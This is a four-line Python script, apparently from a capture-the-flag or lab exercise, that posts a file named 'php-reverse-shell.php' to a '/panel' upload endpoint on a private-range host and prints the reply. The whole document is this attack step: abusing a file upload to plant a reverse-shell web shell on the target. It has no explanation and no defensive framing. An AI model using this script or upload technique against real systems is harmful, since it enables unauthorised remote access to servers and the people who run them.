import requests
files= {'file': open('php-reverse-shell.php')}
r = requests.post('http://10.10.104.16/panel',files=files)
print(r.text)
